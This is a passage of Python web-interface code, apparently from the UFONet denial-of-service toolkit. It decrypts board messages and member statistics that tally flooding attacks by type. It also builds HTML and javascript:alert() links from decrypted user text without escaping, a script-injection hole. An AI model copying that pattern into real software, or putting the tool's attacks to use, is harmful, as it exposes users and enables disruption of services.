            self.pages["/wargames"] = self.html_wargames()
        if page == "/links":
            self.pages["/links"] = self.html_links()
        if page == "/streams":
            self.pages["/streams"] = self.html_streams()
        if page == "/games":
            self.pages["/games"] = self.html_games()
        if page == "/spaceinvaders":
            self.pages["/spaceinvaders"] = self.html_spaceinvaders()
        if page == "/browser":
            self.pages["/browser"] = self.html_browser()
        if page == "/globalnet":
            self.pages["/globalnet"] = self.html_globalnet()
        if page == "/grid_profile":
            if pGet=={}:
                self.pages["/grid_profile"] = self.html_grid_profile()
            else:
                self.save_grid(pGet)
                self.pages["/grid_profile"] = self.html_grid_profile_submit()
        if page == "/board_profile":
            if pGet  =={}:
                self.pages["/board_profile"] = self.html_board_profile()
            else:
                self.save_profile(pGet)
                self.pages["/board_profile"] = self.html_board_profile_submit()
        if page == "/board_remove":
            self.pages["/board_remove"] = self.html_board_remove()
        if page == "/grid_remove":
            self.pages["/grid_remove"] = self.html_grid_remove()
        if page == "/cmd_decrypt_moderator_board":
            self.pages["/cmd_decrypt_moderator_board"] = "<pre>Waiting for decrypting results...</pre>"
            try:
                board_key = pGet["board_key"]
            except:
                board_key = ""
            try:
                filter = pGet["filter"]
            except:
                filter = ""
            end_mark = "\n[Info] [AI] End of decryption."
            if board_key is not "": # board decryption
                nodec_text = "***[ENCRYPTED WITH OTHER KEY]"
                f = open("/tmp/out", "w")
                b = "<center><table border='1' cellpadding='10' cellspacing='5' align=center>"
                f.write(str(b)+"\n")
                self.list_moderator_rev = reversed(self.list_moderator) # order by DESC
                for m in self.list_moderator_rev: # msg = topic | icon | nick | id | comment
                    if board_msg_sep in m:
                        m = m.split(board_msg_sep)
                        topic = m[0] # topic
                        t = m[1] # icon
                        n = m[2] # nick
                        g = m[3] # id
                        l = m[4] # comment
                        if topic == "1":
                            topic = "/GENERAL"
                        elif topic == "2":
                            topic = "/#OPSEC "
                        elif topic == "3":
                            topic = "/FAQ    "
                        elif topic == "4":
                            topic = "/BUGS   "
                        elif topic == "5":
                            topic = "/MEDIA  "
                        else:
                            topic = "/BUGS[!]"
                        operator_img = open("core/images/crew/link"+str(t)+".txt").read()
                        icon = "<img src='data:image/png;base64,"+str(operator_img)+"'>"
                        self.decrypt(board_key, n)
                        if self.decryptedtext:
                            nick = self.decryptedtext
                        else:
                            nick = 'Anonymous' # We are legion!
                        try:
                            nick = nick.decode('latin-1') # parsing for "her.man.xs-latino"
                        except:
                            pass
                        if len(nick) < 3:
                            nick = 'Anonymous'
                        self.decryptedtext = "" # clean decryptedtext buffer
                        id = str(g)[0:6] # only show 6 chars from personal ID (obfuscation)
                        self.decrypt(board_key, l)
                        if self.decryptedtext:
                            msg = self.decryptedtext
                        else:
                            msg = nodec_text
                        try:
                            msg = msg.decode('latin-1')
                        except:
                            pass
                        if len(msg) < 2:
                            msg = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        if filter in topic or filter == "ALL": # filter content by user selection                            
                            b = "<tr valign=top><td align=center>" + str(icon) + "<br>"+str(nick)+"</td><td>"
                            b += "<font size=+2>"+str(topic)+"</font>"
                            b += "<br>by "+str(nick)+"<br><br>"
                            b += str(msg) + "</td></tr>"
                            f.write(str(b)+"\n")
                        else:
                            pass
                    else: # not valid stream data
                        pass 
                b="</table>"
                f.write(str(b)+"\n")
                f.write(end_mark)
                f.close()  
        if page == "/cmd_decrypt_moderator_board_update":
            if not os.path.exists('/tmp/out'):
                open('/tmp/out', 'w').close()
            with open('/tmp/out', 'r') as f:
                self.pages["/cmd_decrypt_moderator_board_update"] = "<pre>"+f.read()+"<pre>"
        if page == "/cmd_decrypt_grid":
            self.pages["/cmd_decrypt_grid"] = "<pre>Waiting for decrypting results...</pre>"
            try:
                grid_key = pGet["grid_key"]
            except:
                grid_key = ""
            end_mark = "[Info] [AI] End of decryption."
            if grid_key is not "": # grid decryption
                # Mothership stats counters
                mothership_members = 0
                unknown_members = 0
                member_1 = 0 # Rookie
                member_2 = 0 # Mercenary
                member_3 = 0 # Bandit
                member_4 = 0 # UFOmmander!
                member_5 = 0 # UFOl33t!
                mothership_missions = 0
                mothership_transferred = 0
                mothership_attacks = 0
                mothership_loic = 0
                mothership_loris = 0
                mothership_ufosyn = 0
                mothership_spray = 0
                mothership_smurf = 0
                mothership_xmas = 0
                mothership_nuke = 0
                mothership_tachyon = 0
                mothership_monlist = 0
                mothership_fraggle = 0
                mothership_sniper = 0
                mothership_ufoack = 0
                mothership_uforst = 0
                mothership_droper = 0
                mothership_overlap = 0
                mothership_pinger = 0
                mothership_ufoudp = 0
                mothership_chargo = 0
                mothership_dorking = 0
                mothership_maxchargo = 0
                nodec_text = "KEY?"
                grid_table = "<center><u>MEMBERS STATS:</u></center><br><table cellpadding='5' cellspacing='5' border='1'><tr><td align='center'><a id='filter_nickname' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('nickname','"+str(grid_key)+"')>NICK:</a></td><td align='center'><a id='filter_ranking' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ranking','"+str(grid_key)+"')>RANK:</a></td><td align='center'><a id='filter_chargo' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('chargo','"+str(grid_key)+"')>CHARGO:</a></td><td align='center'><a id='filter_dorking' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('dorking','"+str(grid_key)+"')>DORKING:</a></td><td align='center'><a id='filter_transf' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('transferred','"+str(grid_key)+"')>TRANSF:</a></td><td align='center'><a id='filter_maxchargo' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('maxchargo','"+str(grid_key)+"')>MAX.CHARGO:</a></td><td align='center'><a id='filter_missions' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('missions','"+str(grid_key)+"')>MISSIONS:</a></td><td align='center'><a id='filter_attacks' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('attacks','"+str(grid_key)+"')>ATTACKS:</a></td><td align='center'><a id='filter_loic' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('loic','"+str(grid_key)+"')>LOIC:</a></td><td align='center'><a id='filter_loris' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('loris','"+str(grid_key)+"')>LORIS:</a></td><td align='center'><a id='filter_ufosyn' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ufosyn','"+str(grid_key)+"')>UFOSYN:</a></td><td align='center'><a id='filter_spray' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('spray','"+str(grid_key)+"')>SPRAY:</a></td><td align='center'><a id='filter_smurf' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('smurf','"+str(grid_key)+"')>SMURF:</a></td><td align='center'><a id='filter_xmas' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('xmas','"+str(grid_key)+"')>XMAS:</a></td><td align='center'><a id='filter_nuke' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('nuke','"+str(grid_key)+"')>NUKE:</a></td><td align='center'><a id='filter_tachyon' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('tachyon','"+str(grid_key)+"')>TACHYON:</a></td><td align='center'><a id='filter_monlist' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('monlist','"+str(grid_key)+"')>MONLIST:</a></td><td align='center'><a id='filter_fraggle' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('fraggle','"+str(grid_key)+"')>FRAGGLE:</a></td><td align='center'><a id='filter_sniper' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('sniper','"+str(grid_key)+"')>SNIPER:</a></td><td align='center'><a id='filter_ufoack' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ufoack','"+str(grid_key)+"')>UFOACK:</a></td><td align='center'><a id='filter_uforst' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('uforst','"+str(grid_key)+"')>UFORST:</a></td><td align='center'><a id='filter_droper' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('droper','"+str(grid_key)+"')>DROPER:</a></td><td align='center'><a id='filter_overlap' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('overlap','"+str(grid_key)+"')>OVERLAP:</a></td><td align='center'><a id='filter_pinger' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('pinger','"+str(grid_key)+"')>PINGER:</a></td><td align='center'><a id='filter_ufoudp' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('ufoudp','"+str(grid_key)+"')>UFOUDP:</a></td><td align='center'><a id='filter_contact' style='color:red;text-decoration:underline red;' onclick=javascript:GridFilter('contact','"+str(grid_key)+"')>CONTACT:</a></td></tr>"
                grid_key = pGet["grid_key"]
                f = open("/tmp/out", "w")
                self.list_grid_rev = reversed(self.list_grid) # order by DESC
                for m in self.list_grid_rev: # rev(msg) = nickname, ranking, chargo, dorking, transf, maxchargo, missions, attacks, loic, loris, ufosyn, spray, smurf, xmas, nuke, tachyon, monlist, fraggle, sniper, ufoack, uforst, droper, overlap, pinger, ufoudp, contact, ID
                    if grid_msg_sep in m:
                        version = m.count(grid_msg_sep) # check UFONet stream version (10->0.9|11->1.0|12->1.1|13->1.2|14->1.2.1|15->1.3|16->1.4|26->1.5)
                        m = m.split(grid_msg_sep)
                        mothership_members = mothership_members + 1 # add new registered member to mothership stats
                        grid_nickname = m[0] # nickname
                        self.decrypt(grid_key, grid_nickname)
                        if self.decryptedtext:
                            grid_nickname = self.decryptedtext
                        else:
                            grid_nickname = nodec_text
                            unknown_members = unknown_members + 1 # add members as unknown
                        self.decryptedtext = "" # clean decryptedtext buffer
                        if len(grid_nickname) > 12 or len(grid_nickname) < 3: # m[0] = grid_nickname (>str3<str12)
                            grid_nickname = "Anonymous"
                        else: 
                            grid_nickname = str(grid_nickname) # nickname
                        grid_ranking = m[1] # ranking
                        self.decrypt(grid_key, grid_ranking)
                        if self.decryptedtext:
                            try:
                                grid_ranking = int(self.decryptedtext)
                            except:
                                grid_ranking = nodec_text
                        else:
                            grid_ranking = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        if grid_ranking == 1: #Rookie
                            grid_ranking = "<font color='white' size='4'>*</font>"
                            member_1 = member_1 + 1
                        elif grid_ranking == 2: # Mercenary
                            grid_ranking = "<font color='cyan' size='4'>**</font>"
                            member_2 = member_2 + 1
                        elif grid_ranking == 3: # Bandit 
                            grid_ranking = "<font color='blueviolet' size='4'>***</font>"
                            member_3 = member_3 + 1
                        elif grid_ranking == 4: # UFOmmander!
                            grid_ranking = "<font color='blue' size='4'>****</font>"
                            member_4 = member_4 + 1
                        elif grid_ranking == 5: # UFOl33t!
                            grid_ranking = "<font color='red' size='4'>&#x25BC;</font>"
                            member_5 = member_5 + 1
                        else:
                            grid_ranking = nodec_text
                        grid_totalchargo = m[2] # total chargo
                        self.decrypt(grid_key, grid_totalchargo)
                        if self.decryptedtext:
                            grid_totalchargo = self.decryptedtext
                        else:
                            grid_totalchargo = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_totalchargo = int(grid_totalchargo)
                            mothership_chargo = mothership_chargo + grid_totalchargo
                        except:
                            grid_totalchargo = nodec_text
                        grid_dorking = m[3] # dorking
                        self.decrypt(grid_key, grid_dorking)
                        if self.decryptedtext:
                            grid_dorking = self.decryptedtext
                        else:
                            grid_dorking = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_dorking = int(grid_dorking)
                            mothership_dorking = mothership_dorking + grid_dorking
                        except:
                            grid_dorking = nodec_text
                        grid_transferred = m[4] # transferred
                        self.decrypt(grid_key, grid_transferred)
                        if self.decryptedtext:
                            grid_transferred = self.decryptedtext
                        else:
                            grid_transferred = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_transferred = int(grid_transferred)
                            mothership_transferred = mothership_transferred + grid_transferred
                        except:
                            grid_transferred = nodec_text
                        grid_maxchargo = m[5] # maxchargo
                        self.decrypt(grid_key, grid_maxchargo)
                        if self.decryptedtext:
                            grid_maxchargo = self.decryptedtext
                        else:
                            grid_maxchargo = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_maxchargo = int(grid_maxchargo)
                            mothership_maxchargo = mothership_maxchargo + grid_maxchargo
                        except:
                            grid_maxchargo = nodec_text
                        grid_missions = m[6] # missions
                        self.decrypt(grid_key, grid_missions)
                        if self.decryptedtext:
                            grid_missions = self.decryptedtext
                        else:
                            grid_missions = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_missions = int(grid_missions)
                            mothership_missions = mothership_missions + grid_missions
                        except:
                            grid_missions = nodec_text
                        grid_attacks = m[7] # attacks
                        self.decrypt(grid_key, grid_attacks)
                        if self.decryptedtext:
                            grid_attacks = self.decryptedtext
                        else:
                            grid_attacks = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_attacks = int(grid_attacks)
                            mothership_attacks = mothership_attacks + grid_attacks
                        except:
                            grid_attacks = nodec_text
                        grid_loic = m[8] # loic
                        self.decrypt(grid_key, grid_loic)
                        if self.decryptedtext:
                            grid_loic = self.decryptedtext
                        else:
                            grid_loic = nodec_text
                        self.decryptedtext = "" # clean decryptedtext buffer
                        try: # parse for int
                            grid_loic = int(grid_loic)
                            mothership_loic = mothership_loic + grid_loic
                        except:
                            grid_loic = nodec_text
                        if version > 17 or version == 17 or version == 16 or version == 15 or version == 12 or version == 11: 
                            grid_loris = m[9] # loris
                            self.decrypt(grid_key, grid_loris)
                            if self.decryptedtext:
                                grid_loris = self.decryptedtext
                            else:
                                grid_loris = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_loris = int(grid_loris)
                                mothership_loris = mothership_loris + grid_loris
                            except:
                                grid_loris = nodec_text
                        else: 
                            grid_loris = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not loris present
                            self.decrypt(grid_key, grid_loris)
                            if self.decryptedtext:
                                grid_loris = self.decryptedtext
                            else:
                                grid_loris = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_loris = int(grid_loris)
                                mothership_loris = mothership_loris + grid_loris
                            except:
                                grid_loris = nodec_text
                        if version > 17 or version == 17 or version == 16 or version == 15 or version == 12: 
                            grid_ufosyn = m[10] # ufosyn
                            self.decrypt(grid_key, grid_ufosyn)
                            if self.decryptedtext:
                                grid_ufosyn = self.decryptedtext
                            else:
                                grid_ufosyn = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_ufosyn = int(grid_ufosyn)
                                mothership_ufosyn = mothership_ufosyn + grid_ufosyn
                            except:
                                grid_ufosyn = nodec_text
                        else:
                            grid_ufosyn = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not ufosyn present
                            self.decrypt(grid_key, grid_ufosyn)
                            if self.decryptedtext:
                                grid_ufosyn = self.decryptedtext
                            else:
                                grid_ufosyn = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_ufosyn = int(grid_ufosyn)
                                mothership_ufosyn = mothership_ufosyn + grid_ufosyn
                            except:
                                grid_ufosyn = nodec_text
                        if version > 17 or version == 17 or version == 16 or version == 15: 
                            grid_spray = m[11] # spray
                            self.decrypt(grid_key, grid_spray)
                            if self.decryptedtext:
                                grid_spray = self.decryptedtext
                            else:
                                grid_spray = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_spray = int(grid_spray)
                                mothership_spray = mothership_spray + grid_spray
                            except:
                                grid_spray = nodec_text
                        else:
                            grid_spray = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not spray present
                            self.decrypt(grid_key, grid_spray)
                            if self.decryptedtext:
                                grid_spray = self.decryptedtext
                            else:
                                grid_spray = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_spray = int(grid_spray)
                                mothership_spray = mothership_spray + grid_spray
                            except:
                                grid_spray = nodec_text
                        if version > 17 or version == 17 or version == 16 or version == 15: 
                            grid_smurf = m[12] # smurf
                            self.decrypt(grid_key, grid_smurf)
                            if self.decryptedtext:
                                grid_smurf = self.decryptedtext
                            else:
                                grid_smurf = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_smurf = int(grid_smurf)
                                mothership_smurf = mothership_smurf + grid_smurf
                            except:
                                grid_smurf = nodec_text
                        else:
                            grid_smurf = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not smurf present
                            self.decrypt(grid_key, grid_smurf)
                            if self.decryptedtext:
                                grid_smurf = self.decryptedtext
                            else:
                                grid_smurf = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_smurf = int(grid_smurf)
                                mothership_smurf = mothership_smurf + grid_smurf
                            except:
                                grid_smurf = nodec_text
                        if version > 17 or version == 17 or version == 16 or version == 15: 
                            grid_xmas = m[13] # xmas
                            self.decrypt(grid_key, grid_xmas)
                            if self.decryptedtext:
                                grid_xmas = self.decryptedtext
                            else:
                                grid_xmas = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_xmas = int(grid_xmas)
                                mothership_xmas = mothership_xmas + grid_xmas
                            except:
                                grid_xmas = nodec_text
                        else:
                            grid_xmas = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not xmas present
                            self.decrypt(grid_key, grid_xmas)
                            if self.decryptedtext:
                                grid_xmas = self.decryptedtext
                            else:
                                grid_xmas = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_xmas = int(grid_xmas)
                                mothership_xmas = mothership_xmas + grid_xmas
                            except:
                                grid_xmas = nodec_text
                        if version > 17 or version == 17 or version == 16: 
                            grid_nuke = m[14] # nuke
                            self.decrypt(grid_key, grid_nuke)
                            if self.decryptedtext:
                                grid_nuke = self.decryptedtext
                            else:
                                grid_nuke = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_nuke = int(grid_nuke)
                                mothership_nuke = mothership_nuke + grid_nuke
                            except:
                                grid_nuke = nodec_text
                        else:
                            grid_nuke = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not nuke present
                            self.decrypt(grid_key, grid_nuke)
                            if self.decryptedtext:
                                grid_nuke = self.decryptedtext
                            else:
                                grid_nuke = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_nuke = int(grid_nuke)
                                mothership_nuke = mothership_nuke + grid_nuke
                            except:
                                grid_nuke = nodec_text
                        if version > 17 or version == 17: 
                            grid_tachyon = m[15] # tachyon
                            self.decrypt(grid_key, grid_tachyon)
                            if self.decryptedtext:
                                grid_tachyon = self.decryptedtext
                            else:
                                grid_tachyon = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_tachyon = int(grid_tachyon)
                                mothership_tachyon = mothership_tachyon + grid_tachyon
                            except:
                                grid_tachyon = nodec_text
                        else:
                            grid_tachyon = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not tachyon present
                            self.decrypt(grid_key, grid_tachyon)
                            if self.decryptedtext:
                                grid_tachyon = self.decryptedtext
                            else:
                                grid_tachyon = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_tachyon = int(grid_tachyon)
                                mothership_tachyon = mothership_tachyon + grid_tachyon
                            except:
                                grid_tachyon = nodec_text
                        if version > 17: 
                            grid_monlist = m[16] # monlist
                            self.decrypt(grid_key, grid_monlist)
                            if self.decryptedtext:
                                grid_monlist = self.decryptedtext
                            else:
                                grid_monlist = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_monlist = int(grid_monlist)
                                mothership_monlist = mothership_monlist + grid_monlist
                            except:
                                grid_monlist = nodec_text
                            grid_fraggle = m[17] # fraggle
                            self.decrypt(grid_key, grid_fraggle)
                            if self.decryptedtext:
                                grid_fraggle = self.decryptedtext
                            else:
                                grid_fraggle = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_fraggle = int(grid_fraggle)
                                mothership_fraggle = mothership_fraggle + grid_fraggle
                            except:
                                grid_fraggle = nodec_text
                            grid_sniper = m[18] # sniper
                            self.decrypt(grid_key, grid_sniper)
                            if self.decryptedtext:
                                grid_sniper = self.decryptedtext
                            else:
                                grid_sniper = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_sniper = int(grid_sniper)
                                mothership_sniper = mothership_sniper + grid_sniper
                            except:
                                grid_sniper = nodec_text
                            grid_ufoack = m[19] # ufoack
                            self.decrypt(grid_key, grid_ufoack)
                            if self.decryptedtext:
                                grid_ufoack = self.decryptedtext
                            else:
                                grid_ufoack = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_ufoack = int(grid_ufoack)
                                mothership_ufoack = mothership_ufoack + grid_ufoack
                            except:
                                grid_ufoack = nodec_text
                            grid_uforst = m[20] # uforst
                            self.decrypt(grid_key, grid_uforst)
                            if self.decryptedtext:
                                grid_uforst = self.decryptedtext
                            else:
                                grid_uforst = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_uforst = int(grid_uforst)
                                mothership_uforst = mothership_uforst + grid_uforst
                            except:
                                grid_uforst = nodec_text
                            grid_droper = m[21] # droper
                            self.decrypt(grid_key, grid_droper)
                            if self.decryptedtext:
                                grid_droper = self.decryptedtext
                            else:
                                grid_droper = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_droper = int(grid_droper)
                                mothership_droper = mothership_droper + grid_droper
                            except:
                                grid_droper = nodec_text
                            grid_overlap = m[22] # overlap
                            self.decrypt(grid_key, grid_overlap)
                            if self.decryptedtext:
                                grid_overlap = self.decryptedtext
                            else:
                                grid_overlap = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_overlap = int(grid_overlap)
                                mothership_overlap = mothership_overlap + grid_overlap
                            except:
                                grid_overlap = nodec_text
                            grid_pinger = m[23] # pinger
                            self.decrypt(grid_key, grid_pinger)
                            if self.decryptedtext:
                                grid_pinger = self.decryptedtext
                            else:
                                grid_pinger = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_pinger = int(grid_pinger)
                                mothership_pinger = mothership_pinger + grid_pinger
                            except:
                                grid_pinger = nodec_text
                            grid_ufoudp = m[24] # ufoudp
                            self.decrypt(grid_key, grid_ufoudp)
                            if self.decryptedtext:
                                grid_ufoudp = self.decryptedtext
                            else:
                                grid_ufoudp = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_ufoudp = int(grid_ufoudp)
                                mothership_ufoudp = mothership_ufoudp + grid_ufoudp
                            except:
                                grid_ufoudp = nodec_text
                        else:
                            grid_monlist = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not monlist present
                            self.decrypt(grid_key, grid_monlist)
                            if self.decryptedtext:
                                grid_monlist = self.decryptedtext
                            else:
                                grid_monlist = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_monlist = int(grid_monlist)
                                mothership_monlist = mothership_monlist + grid_monlist
                            except:
                                grid_monlist = nodec_text
                            grid_fraggle = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not fraggle present
                            self.decrypt(grid_key, grid_fraggle)
                            if self.decryptedtext:
                                grid_fraggle = self.decryptedtext
                            else:
                                grid_fraggle = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_fraggle = int(grid_fraggle)
                                mothership_fraggle = mothership_fraggle + grid_fraggle
                            except:
                                grid_fraggle = nodec_text
                            grid_sniper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not sniper present
                            self.decrypt(grid_key, grid_sniper)
                            if self.decryptedtext:
                                grid_sniper = self.decryptedtext
                            else:
                                grid_sniper = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_sniper = int(grid_sniper)
                                mothership_sniper = mothership_sniper + grid_sniper
                            except:
                                grid_sniper = nodec_text
                            grid_ufoack = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not ufoack present
                            self.decrypt(grid_key, grid_ufoack)
                            if self.decryptedtext:
                                grid_ufoack = self.decryptedtext
                            else:
                                grid_ufoack = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_ufoack = int(grid_ufoack)
                                mothership_ufoack = mothership_ufoack + grid_ufoack
                            except:
                                grid_ufoack = nodec_text
                            grid_uforst = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not uforst present
                            self.decrypt(grid_key, grid_uforst)
                            if self.decryptedtext:
                                grid_uforst = self.decryptedtext
                            else:
                                grid_uforst = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_uforst = int(grid_uforst)
                                mothership_uforst = mothership_uforst + grid_uforst
                            except:
                                grid_uforst = nodec_text
                            grid_droper = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not droper present
                            self.decrypt(grid_key, grid_droper)
                            if self.decryptedtext:
                                grid_droper = self.decryptedtext
                            else:
                                grid_droper = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_droper = int(grid_droper)
                                mothership_droper = mothership_droper + grid_droper
                            except:
                                grid_droper = nodec_text
                            grid_overlap = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not overlap present
                            self.decrypt(grid_key, grid_overlap)
                            if self.decryptedtext:
                                grid_overlap = self.decryptedtext
                            else:
                                grid_overlap = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_overlap = int(grid_overlap)
                                mothership_overlap = mothership_overlap + grid_overlap
                            except:
                                grid_overlap = nodec_text
                            grid_pinger = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not pinger present
                            self.decrypt(grid_key, grid_pinger)
                            if self.decryptedtext:
                                grid_pinger = self.decryptedtext
                            else:
                                grid_pinger = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_pinger = int(grid_pinger)
                                mothership_pinger = mothership_pinger + grid_pinger
                            except:
                                grid_pinger = nodec_text
                            grid_ufoudp = str("2OwgWPTsDw8k6f6sgnGLOw8vAb1PSrs+NkeLNPxEyJO3ahKV0Q==") # not ufoudp present
                            self.decrypt(grid_key, grid_ufoudp)
                            if self.decryptedtext:
                                grid_ufoudp = self.decryptedtext
                            else:
                                grid_ufoudp = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            try: # parse for int
                                grid_ufoudp = int(grid_ufoudp)
                                mothership_ufoudp = mothership_ufoudp + grid_ufoudp
                            except:
                                grid_ufoudp = nodec_text
                        if version == 26:
                            grid_contact = m[25] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            if len(grid_contact) > 120 or len(grid_contact) < 3: # m[25] = grid_contact (>str3<str120)
                                grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            else:
                                try:
                                    if " " in grid_contact: # m[25] = grid_contact
                                        grid_contact = grid_contact.replace(" ","")
                                    grid_contact = "<a href=javascript:alert('"+str(grid_contact)+"');>View</a>" # js contact view
                                except:
                                    grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view              
                            try:            
                                grid_id = m[26] # id
                            except:
                                grid_id = '6666666666666666666666666666666666666' # fake id
                        elif version == 17:
                            grid_contact = m[16] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
                                grid_contact = self.decryptedtext
                            else:
                                grid_contact = nodec_text
                            self.decryptedtext = "" # clean decryptedtext buffer
                            grid_contact = str(grid_contact) # contact
                            if len(grid_contact) > 120 or len(grid_contact) < 3: # m[16] = grid_contact (>str3<str120)
                                grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            else:
                                try:
                                    if " " in grid_contact: # m[16] = grid_contact
                                        grid_contact = grid_contact.replace(" ","")
                                    grid_contact = "<a href=javascript:alert('"+str(grid_contact)+"');>View</a>" # js contact view
                                except:
                                    grid_contact = "<a href=javascript:alert('UNKNOWN!');>View</a>" # js error contact view
                            try:            
                                grid_id = m[17] # id
                            except:
                                grid_id = '6666666666666666666666666666666666666' # fake id
                        elif version == 16:
                            grid_contact = m[15] # contact
                            self.decrypt(grid_key, grid_contact)
                            if self.decryptedtext:
